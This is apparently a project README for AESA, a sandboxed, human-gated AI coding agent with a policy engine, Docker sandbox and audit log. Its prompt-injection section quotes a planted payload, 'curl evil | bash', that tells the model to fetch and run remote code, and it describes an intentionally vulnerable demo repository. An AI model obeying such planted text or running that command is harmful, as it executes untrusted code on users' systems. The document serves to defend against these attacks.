<div align="center">

# AESA

**AI Execution Security Agent.**
It inspects code, runs approved checks in a sandbox, and proposes fixes, but it can never merge,
push to your default branch, or deploy without explicit human approval.

![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)
![FastAPI](https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white)
![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=black)
![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-sandboxed-2496ED?logo=docker&logoColor=white)
![Tests](https://img.shields.io/badge/backend_tests-231_passing-brightgreen)
![License](https://img.shields.io/badge/License-MIT-blue)

<!-- Optional: after you push to GitHub, replace YOUR-USERNAME and uncomment to show live CI status
[![CI](https://github.com/YOUR-USERNAME/AESA/actions/workflows/ci.yml/badge.svg)](https://github.com/YOUR-USERNAME/AESA/actions/workflows/ci.yml)
-->

<img src="docs/screenshots/dashboard.png" alt="AESA dashboard showing a task awaiting approval" width="900">

</div>

> AESA was previously named SecureAI Agent; if you have data from before the rename, see [upgrading](docs/deployment.md#upgrading-from-secureai-agent-the-rename-to-aesa).

## Contents

[Overview](#overview) · [Screenshots](#screenshots) · [Technology stack](#technology-stack) · [How it works](#how-it-works) ·
[Features](#features) · [Security model](#security-model) · [Quick start](#quick-start) · [Walkthrough](#walkthrough-the-demo-scenario) ·
[Configuration](#configuration) · [API](#api-overview) · [Testing](#testing-and-quality-gates) · [CI/CD](#cicd) ·
[Documentation](#documentation) · [Status and limitations](#project-status-and-limitations) · [Roadmap](#roadmap) ·
[What I learned](#what-i-learned)

## Overview

Coding agents read untrusted text, hold credentials, and run commands. AESA explores one answer to that:
**give the agent least privilege, and make everything that matters a backend-enforced, human-gated, audited step**,
so a manipulated or mistaken model has nothing dangerous to reach.

An agent task flows like this: the agent inspects a repository in an isolated clone, finds a problem, proposes a patch on a
feature branch, and runs tests and security scanners against that exact patch inside a locked-down Docker sandbox. A person then
reviews the diff and the results and decides. Only after approval does the backend commit and push the proposal branch; CI runs;
and deployment needs a **second, separate approval**.

> **The AI model is never the security boundary.** The policy engine, filesystem guard, command registry, sandbox,
> authentication, CI checks and human approvals each enforce security independently. The system stays safe even when the
> model hallucinates or obeys malicious text hidden in a repository.

## Screenshots

### Dashboard
Agent status, the current task with its progress through the approval gates, security and CI status, and what is waiting on a person.

<img src="docs/screenshots/dashboard.png" alt="Dashboard with a task awaiting approval" width="900">

### Agent task in progress
The gate tracker shows where the task is in the state machine; the action list shows every tool call the agent made and why.
Only concise, structured explanations are stored, never raw reasoning.

<img src="docs/screenshots/task-running.png" alt="Agent task page while analyzing, with gate tracker and action list" width="900">

### Reviewing a proposed change
The reviewer sees what the agent wants to change, the before/after diff, test and security results, the risk level, and the
decision buttons. The decision is bound to the exact patch hash that was reviewed.

<img src="docs/screenshots/change-review.png" alt="Change review with diff, scan table and Approve, Reject and Request changes buttons" width="900">

### A failing security check blocks approval
If any required check fails, errors, or was not run against the current patch, approval is refused by the **server**, not just
disabled in the UI.

<img src="docs/screenshots/gate-blocked.png" alt="Approval blocked by a failing security check" width="900">

### Audit log, filtered to denied actions
Every action is recorded, including everything the policy engine refused. The log is append-only and hash-chained, and secrets
are redacted before anything is stored.

<img src="docs/screenshots/audit-denied.png" alt="Audit log filtered to status DENIED" width="900">

### CI/CD and deployment approval
Pipeline status, per-job results, scan history, and the separate deployment approval.

<img src="docs/screenshots/cicd.png" alt="CI/CD page with pipeline, scans and deployment approval" width="900">

## Technology stack

| Area | Technologies |
|---|---|
| **Backend** | Python 3.12, FastAPI, Pydantic v2, SQLAlchemy 2, Alembic, Uvicorn |
| **Authentication** | Argon2id password hashing (argon2-cffi), JWT (PyJWT), role-based access control, login throttling |
| **AI layer** | `AIProvider` abstraction: OpenAI-compatible (any `/chat/completions` server), Gemini, and an offline rule-based provider (httpx) |
| **Frontend** | React 18, TypeScript 5, Vite, Tailwind CSS 4, React Router 7, IBM Plex Sans/Mono |
| **Database** | SQLite by default; schema and code are PostgreSQL-compatible |
| **Sandbox and infrastructure** | Docker, Docker Compose, a restricted Docker socket proxy (tecnativa/docker-socket-proxy), Git CLI, GitHub REST API |
| **Security tooling** | Trivy, Gitleaks, Bandit, Ruff, mypy, `npm audit` |
| **Testing** | pytest, Vitest |
| **CI/CD** | GitHub Actions |

## How it works

```mermaid
flowchart LR
    U[User] --> D[Web dashboard<br/>React + TypeScript]
    D --> A[FastAPI<br/>auth + RBAC]
    A --> O[Agent orchestrator]
    O --> P[Policy engine]
    P --> T[Tool executor]
    T --> S[Docker sandbox]
    S --> R[Isolated repo clone]
    R --> C[Tests + security scans]
    C --> H{{Human approval}}
    H --> CI[CI/CD]
    CI --> H2{{Deployment approval}}
    H2 --> X[Deployment]
```

Every model-requested action passes through one choke point: **validate** (Pydantic schema) → **policy decision** (persisted) →
**execute** (path guard / command registry / sandbox) → **redact** → **audit**. Anything not on the allowlist does not exist.

### Task lifecycle

```mermaid
stateDiagram-v2
    [*] --> DRAFT
    DRAFT --> ANALYZING
    ANALYZING --> PROPOSED
    PROPOSED --> AWAITING_APPROVAL
    AWAITING_APPROVAL --> APPROVED: human approves
    AWAITING_APPROVAL --> REJECTED: human rejects
    AWAITING_APPROVAL --> CHANGES_REQUESTED
    APPROVED --> APPLIED
    APPLIED --> CI_RUNNING
    CI_RUNNING --> CI_PASSED
    CI_RUNNING --> CI_FAILED
    CI_PASSED --> READY_FOR_DEPLOYMENT
    READY_FOR_DEPLOYMENT --> DEPLOY_APPROVED: second human approval
    DEPLOY_APPROVED --> DEPLOYED
```

Any failure (AI provider error, sandbox unavailable, repeated policy denials, malformed output, step budget) ends in
`FAILED_SAFELY`. The state machine rejects illegal transitions, so the approval workflow cannot be skipped.

## Features

- **Agent loop** with 12 structured tools: `list_files`, `read_file`, `search_code`, `git_status`, `git_diff`, `run_tests`,
  `run_linter`, `run_security_scan`, `create_patch`, `create_branch`, `request_approval`, `create_pull_request`. Arguments are
  validated by Pydantic; malformed or unauthorized calls are rejected.
- **Provider-agnostic AI**: configure OpenAI-compatible or Gemini through environment variables. An offline rule-based provider lets
  the whole demo run with no API key.
- **Central policy engine**: default-deny, evaluated before every action, every decision persisted and audited.
- **Safe file access**: canonical paths, allowlist, sensitive-file blocklist, symlink-escape protection, and protected paths
  (CI, sandbox, Dockerfiles, policy code) the agent can never edit.
- **Controlled command execution**: a structured command registry (never a shell string), timeouts, output caps, scrubbed
  environment, process-group kill.
- **Hardened Docker sandbox**: non-root, no network, all capabilities dropped, read-only root, resource limits, ephemeral, a single
  workspace mount, no Docker socket.
- **Security gate**: pytest, Ruff, mypy, Bandit, Gitleaks and Trivy (plus `npm test` / `npm audit` for JavaScript) must pass for the
  *exact* patch before approval. A scanner that cannot run counts as a failure.
- **Two human approvals**: one for the patch, a separate one for deployment. No self-approval.
- **Safe Git workflow**: patch → `agent/proposal-<id>` branch → pull request. Never the default branch, never forced.
- **Tamper-evident audit log**: append-only (database triggers), SHA-256 hash-chained, searchable in the UI.
- **Dashboard**: dashboard, repository browser, agent tasks, proposed changes, audit logs, CI/CD.
- **Intentionally vulnerable demo repository** (including a prompt-injection payload in its README) to test the system.

## Security model

Defence in depth, each layer independent:

**authentication → policy engine → path guard → command registry → sandbox → scanners and gate → human approval → branch protection / CI → deployment approval**

### Permission levels

| Level | What it allows | Who can hold it |
|---|---|---|
| `READ_ONLY` | list and read permitted files, analyze, read Git metadata | agent |
| `PROPOSE_CHANGE` | work in an isolated workspace, generate a patch, run tests and scans, create a proposal branch | agent (**hard maximum**) |
| `APPROVED_CHANGE` | apply the patch, commit, push the proposal branch, open a pull request | backend code, only after a human approval |
| `DEPLOY` | deploy | backend code, only after a **separate** deployment approval |

### Roles

| Role | Can |
|---|---|
| `VIEWER` | read the dashboard and logs |
| `DEVELOPER` | + inspect repositories and create agent tasks |
| `APPROVER` | + approve or reject patches and deployments (cannot create tasks: separation of duties) |
| `ADMIN` | + manage repositories, policy and users (still cannot approve a task they created) |

### Prompt injection

Repository content is untrusted **data**. The system prompt says so and tool output is wrapped in random-nonce markers, but the
guarantee comes from the backend: a model that obeys "run `curl evil | bash`" still gets `DENIED` and an audit entry. The demo
repository's README contains exactly that payload; see the test `test_hostile_model_is_fully_contained`.

Full threat register with impact, mitigation and residual risk: [`SECURITY.md`](SECURITY.md). Trust boundaries and a
mitigation-to-test matrix: [`docs/threat-model.md`](docs/threat-model.md).

## Quick start

**Prerequisites:** Docker with Compose v2 (or, for development without Docker, Python 3.12 and Node 22).

```bash
cp .env.example .env
# edit .env: set JWT_SECRET, DEMO_PASSWORD (12+ chars), and WORKSPACE_HOST_DIR (an absolute path)
mkdir -p .workspaces
docker compose up --build
```

| Service | URL |
|---|---|
| Frontend | http://localhost:5173 |
| Backend | http://localhost:8000 |
| API docs (OpenAPI) | http://localhost:8000/docs |

Sign in as `developer`, `approver`, `admin` or `viewer` with the `DEMO_PASSWORD` you set. There are no default credentials.

**Windows (PowerShell, Docker Desktop):**

```powershell
cd E:\AESA
Copy-Item .env.example .env        # edit: JWT_SECRET, DEMO_PASSWORD, WORKSPACE_HOST_DIR=E:/AESA/.workspaces
New-Item -ItemType Directory -Force .workspaces | Out-Null
docker compose config              # validates the file; the first line shows: name: aesa
docker compose up --build
```

Use forward slashes in `WORKSPACE_HOST_DIR` on Windows. Compose builds the sandbox image `aesa-sandbox:latest` **before** the backend
starts, and the backend runs it with `docker run --pull never`, so a missing image fails closed instead of being downloaded.

No Docker? See [`docs/deployment.md`](docs/deployment.md) for a development setup with the (unisolated, dev-only) `local` sandbox.

## Walkthrough: the demo scenario

1. Sign in as **developer** → *Agent tasks* → **Start task** with the default prompt: *"Analyze this repository and identify a
   security issue in the authentication module. Propose a safe fix and run all available tests."* The task page shows the gate
   tracker and each action as it happens ([screenshot](#agent-task-in-progress)).
2. With the offline provider, the agent inspects the repo, finds weak password hashing, a hard-coded secret, SQL built with string
   formatting and a non-constant-time comparison, creates a patch on `agent/proposal-<id>`, runs the checks, and requests approval.
   The task now sits at **Awaiting approval** on the [dashboard](#dashboard).
3. Sign in as **approver** → *Proposed changes* → open the request. Review the diff, results and risk
   ([screenshot](#reviewing-a-proposed-change)). If a required check fails, **Approve is refused** by the server
   ([screenshot](#a-failing-security-check-blocks-approval)).
4. **Approve.** The backend applies the stored, hash-verified patch, commits, pushes the proposal branch, and CI runs against it.
5. When CI passes the task becomes **Ready for deployment**. A second approval, then **Run deployment**
   ([screenshot](#cicd-and-deployment-approval)). The default deploy target is a dry run that touches no infrastructure.
6. Open *Audit logs* and filter to `DENIED` to see everything the policy engine refused ([screenshot](#audit-log-filtered-to-denied-actions)).

Prefer the terminal? With the stack running: `DEMO_PASSWORD=... python scripts/demo_e2e.py` drives the whole flow over HTTP. A real,
recorded audit trail (including a hostile-model run where every attack is denied) is in
[`docs/example-audit-log.txt`](docs/example-audit-log.txt).

## Configuration

Everything is configured through environment variables; nothing is hard-coded. See [`.env.example`](.env.example) for the full,
annotated list. The important ones:

| Variable | Purpose |
|---|---|
| `JWT_SECRET` | 32+ characters; required in production |
| `DATABASE_URL` | SQLite (default) or a PostgreSQL URL |
| `AI_PROVIDER`, `AI_API_KEY`, `AI_BASE_URL`, `AI_MODEL` | `scripted` (offline), `openai` (any OpenAI-compatible server) or `gemini` |
| `GITHUB_TOKEN`, `GITHUB_WEBHOOK_SECRET`, `DEPLOY_TARGET` | optional GitHub integration; use a least-privilege token |
| `SANDBOX_BACKEND` | `docker` (default, fails closed) or `local` (development only, **not isolated**) |
| `WORKSPACE_HOST_DIR` | absolute host path for sandbox workspaces (Windows: forward slashes) |
| `BACKEND_DATA_VOLUME` | Docker volume for the database and repositories (default `aesa_backend-data`) |
| `SANDBOX_TRIVY_TMPFS`, `SANDBOX_TRIVY_MEMORY` | larger `/tmp` and memory for the Trivy scan only (defaults `1200m` / `2g`) |
| `REQUIRED_SCANS`, `SECURITY_BLOCK_SEVERITY` | which checks gate approval, and the severity that blocks (default `high`) |
| `ALLOW_SELF_APPROVAL`, `REQUIRE_DISTINCT_DEPLOY_APPROVER` | policy knobs, both off by default |

GitHub setup (least-privilege token, branch protection, `production` environment with required reviewers, webhook) is in
[`docs/deployment.md`](docs/deployment.md#github-setup).

## API overview

Interactive OpenAPI docs at `/docs`. Main endpoints:

| Area | Endpoints |
|---|---|
| Auth | `POST /api/auth/login`, `GET /api/auth/me` |
| Repositories | `GET/POST /api/repositories`, `GET /api/repositories/{id}/tree`, `/stats` |
| Agent tasks | `POST /api/agent/tasks`, `GET /api/agent/tasks/{id}`, `POST /api/agent/tasks/{id}/cancel`, `GET /api/tasks/{id}/actions`, `GET /api/tasks/{id}/diff` |
| Approvals | `GET /api/approvals`, `POST /api/approvals/{id}/approve`, `/reject`, `/request-changes` |
| Security and CI | `GET /api/security/scans/{task_id}`, `GET /api/ci/runs/{task_id}`, `POST /api/ci/webhook` |
| Deployment | `POST /api/deployments/{task_id}/execute` |
| Audit and status | `GET /api/audit-logs`, `GET /api/audit-logs/verify`, `GET /api/dashboard/summary`, `GET /api/policy` |

## Project structure

```text
AESA/
├── backend/                 FastAPI app
│   ├── app/
│   │   ├── agent/           orchestrator, AIProvider implementations, prompts
│   │   ├── policy/          PolicyEngine (default-deny, permission levels)
│   │   ├── tools/           tool schemas, handlers, ToolExecutor (single choke point)
│   │   ├── repository/      path guard, hardened git, isolated workspaces
│   │   ├── sandbox/         command registry, Docker / local runners
│   │   ├── security/        scanner parsers, approval gate
│   │   ├── approvals/       state machine, decisions, applier, deployment
│   │   ├── ci/              GitHub client, CI service
│   │   ├── audit/           redaction, hash-chained append-only log
│   │   └── auth/ api/ models/
│   ├── alembic/             database migrations
│   └── tests/               unit, integration, security and end-to-end tests
├── frontend/                React + TypeScript + Vite + Tailwind dashboard
├── sandbox/                 sandbox image (Dockerfile, Trivy wrapper, verification scripts)
├── demo-repository/         intentionally vulnerable demo service
├── docs/                    architecture, threat model, deployment, UI states, screenshots
├── scripts/                 end-to-end demo driver, audit export
├── .github/workflows/       ci.yml, security.yml
└── docker-compose.yml  .env.example  SECURITY.md  LICENSE
```

## Testing and quality gates

```bash
cd backend
pytest -q                                   # 231 tests (+5 that need Docker, skipped without it)
ruff check .  &&  mypy app  &&  bandit -r app -c bandit.yaml -ll
alembic upgrade head && alembic check       # migrations match the models

cd ../frontend
npm test && npm run build && npm audit --audit-level=high
```

The suite covers the policy engine, path and command validation, redaction and the audit chain, tool schemas, approvals and the
state machine, the Trivy wrapper, scanner parsers (which **fail closed**), role-based access, prompt-injection and hostile-model
containment, and the full workflow from inspection to deployment. It also runs the real scanners as an unprivileged user on a
non-writable workspace, as they run in production.

Docker-dependent checks (`backend/tests/test_docker_sandbox_integration.py`) run through the production code path but are skipped unless
Docker and the sandbox image are available. To run them: `sandbox/scripts/verify-trivy.sh`.

## CI/CD

`.github/workflows/ci.yml`: checkout → install → **Ruff** → **mypy** → **pytest** (+ migrations check) → **frontend test and build** →
**Bandit, Gitleaks, Trivy, `npm audit`** → **container build and Trivy image scan** → artifacts → a **deploy** job in the `production`
environment that waits for a required reviewer. `security.yml` adds a weekly scan (Gitleaks, Trivy, pip-audit) and dependency review on
pull requests. Nothing deploys from an AI request alone.

## Documentation

| Document | What's in it |
|---|---|
| [`SECURITY.md`](SECURITY.md) | security controls, the full threat register, known limitations |
| [`docs/architecture.md`](docs/architecture.md) | module map, request flow, permission levels, state machine |
| [`docs/threat-model.md`](docs/threat-model.md) | trust boundaries, an attack walkthrough, mitigation-to-test matrix |
| [`docs/deployment.md`](docs/deployment.md) | Compose and Windows setup, Trivy in the read-only sandbox, GitHub setup, troubleshooting, production checklist |
| [`docs/ui-states.md`](docs/ui-states.md) | what each UI state shows |
| [`docs/example-audit-log.txt`](docs/example-audit-log.txt) | a recorded audit trail, including denied attacks |

## Project status and limitations

AESA is a learning project that has **not been independently audited**. Please read this before pointing it at anything valuable.

- **The default AI provider is a rule-based stand-in, not an LLM.** It fixes a few classic insecure idioms so the demo works offline.
  Real models plug in through `AI_PROVIDER`; their patches can be worse, which is what the gate and the reviewer are for.
- **Not covered by automated tests:** live GitHub (PRs, Actions, webhooks), live LLM providers and PostgreSQL. They are exercised only
  against mocked transports or not at all.
- **Docker isolation shares the host kernel.** For hostile repositories use gVisor, Kata or rootless Docker. The `local` sandbox backend
  has no isolation and is for development only.
- **Prompt injection can still influence the *content* of a patch.** The backend stops a manipulated model from acting, but a subtle
  backdoor in a diff is the reviewer's job.
- **Permitted source files are sent to your AI provider.** Choose the provider and data terms accordingly.
- "Request changes" ends the task rather than re-running the agent with feedback. The login throttle is in-memory and there is no
  server-side token revocation yet.
- The workspace is not writable by the sandbox user, so a target repo whose tests write into the working directory will fail.

## Roadmap

Re-run the agent with reviewer feedback · SBOM and signed commits or attestations · external anchoring of the audit hash chain ·
gVisor or Firecracker runner · per-user quotas and API rate limiting · live updates over WebSockets · multi-repository policy profiles ·
GitHub App installation-token flow · replay-protected webhooks.

## What I Learned

- **AI agent architecture.** An agent is a loop around an *untrusted proposer*: propose → validate → authorize → execute → observe. The
  valuable engineering is everything around the model. One choke point that every action must pass made it possible to guarantee
  validation, policy, redaction and auditing without trusting each handler to remember them.
- **Tool calling.** A plain JSON-action protocol gave one code path for OpenAI-compatible servers and Gemini. Strict schemas turn
  hallucinated or malformed calls into logged rejections, and a tool that isn't in the registry simply doesn't exist.
- **Least privilege.** Make the dangerous things *structurally unavailable* rather than merely forbidden: commit, push and deploy are
  backend actions that run only after a human decision; the agent's level is clamped in code; the policy context is built from
  database state, never from anything the model says.
- **Prompt injection.** Marking untrusted content helps but is only mitigation. The real answer is assuming the injection succeeds and
  ensuring it has nowhere to go: an obedient model in the tests still has every attack denied.
- **Sandboxing.** "Analyzing" a repository runs its code (pytest imports `conftest.py`; Git can run `core.fsmonitor`). So: work in a clone
  of committed content, harden Git, scrub the environment, run repo code only in a locked-down container, and **fail closed** if the
  sandbox is missing rather than falling back.
- **Secure CI/CD.** Bind evidence to the artifact. Scans are keyed to the patch hash and approval carries that hash, so old results
  can't validate different code. A scanner that errors is a failure, not a pass.
- **GitHub automation.** Use the narrowest token, keep it out of command-line arguments and out of the agent's reach, push only
  backend-named branches, never force, and rely on server-side branch protection as the backstop.
- **Human-in-the-loop systems.** A button is not a control unless the server enforces what it implies: separation of duties, a state
  machine that can't skip states, a second approval for deployment, and server-side re-checks of everything the UI shows.
- **Auditability.** Log denials as carefully as successes, redact before storing, make the log append-only at the database level, and
  hash-chain entries so tampering is detectable.
- **DevSecOps.** Test tools the way production runs them. A mypy crash survived my tests because the test sandbox ran as the
  workspace owner, while production runs as a different, unprivileged user on a directory it can't write. Also lint *every* Python file,
  not just the main package, and gate the pipeline on all of it.
- **AI security risks.** The risks that matter are mostly classic ones amplified by autonomy (injection, excessive agency, secret
  exposure, supply chain, denial of service), plus one unique to LLMs: your source code goes to a provider. Be honest about residual risk.

## License and security

Released under the [MIT License](LICENSE). To report a vulnerability, see [`SECURITY.md`](SECURITY.md).
